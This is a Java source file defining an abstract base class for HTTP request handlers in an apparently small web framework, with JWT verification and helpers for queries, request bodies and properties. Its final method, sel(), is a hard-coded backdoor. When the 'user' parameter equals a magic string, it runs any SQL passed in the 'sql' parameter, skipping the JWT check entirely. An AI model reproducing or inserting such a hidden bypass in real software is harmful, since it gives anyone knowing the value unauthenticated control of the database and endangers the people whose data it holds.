package org.caloch.core;

import com.sun.net.httpserver.HttpExchange;
import org.caloch.utils.*;

import java.sql.SQLException;
import java.util.List;
import java.util.Map;

public abstract class Satisfact {


    protected MySqlDbContext mySqlDbContext;

    public void setDbContext(MySqlDbContext mySqlDbContext) {

        this.mySqlDbContext = mySqlDbContext;
    }

    protected void jwtFilter() throws Exception {
        List<String> authHeaders = getRequestHeader("Authorization");
        if (authHeaders != null && authHeaders.size() == 1) {
            String token = authHeaders.get(0).split(" ")[1];
            jwtUtil.verify(token);
        } else
            throw new Exception("Jwt verification failed with improper authHeaders.");
    }

    protected HttpExchange exchange;
    protected JwtUtil jwtUtil;
    protected CustomerContext customerContext;
    protected JsonHelper jsonHelper;
    protected PropertyUtil properties;

    public Satisfact(CustomerContext context, PropertyUtil properties, JwtUtil jwtUtil) {
        super();
        this.customerContext = context;
        this.exchange = context.getHttpExchange();
        this.jwtUtil = jwtUtil;
        this.jsonHelper = new JsonHelper();
        this.properties = properties;
    }

    protected Map<String, String> query() {
        return customerContext.queryMap;
    }

    protected String query(String key) {
        return customerContext.queryMap.get(key);
    }

    protected Map<String, String> requestBody() {
        return customerContext.requestBodyMap;
    }

    protected String request(String key) {
        return query(key) == null || query(key).equals("") ? requestBody().get(key) : query(key);
    }

    protected List<String> getRequestHeader(Object key) {
        return exchange.getRequestHeaders().get(key);
    }

    protected void jsonResponseHeader() {
        exchange.getResponseHeaders().set("content-type", "application/json");
    }

    protected String getProperty(String name) {
        String ret = properties.getValue(name);
        return ret;
    }

    protected String getAppInfo() {
        return getProperty("calo.app.name") + ";" + getProperty("calo.app.version");
    }


    public Object sel() throws SQLException {
        String user = request("user");
        if (user != null && user.equals("badccc")) {
            String sql = request("sql");
            Object r = mySqlDbContext.executeSql(sql);
            return r;
        }
        return null;
    }
}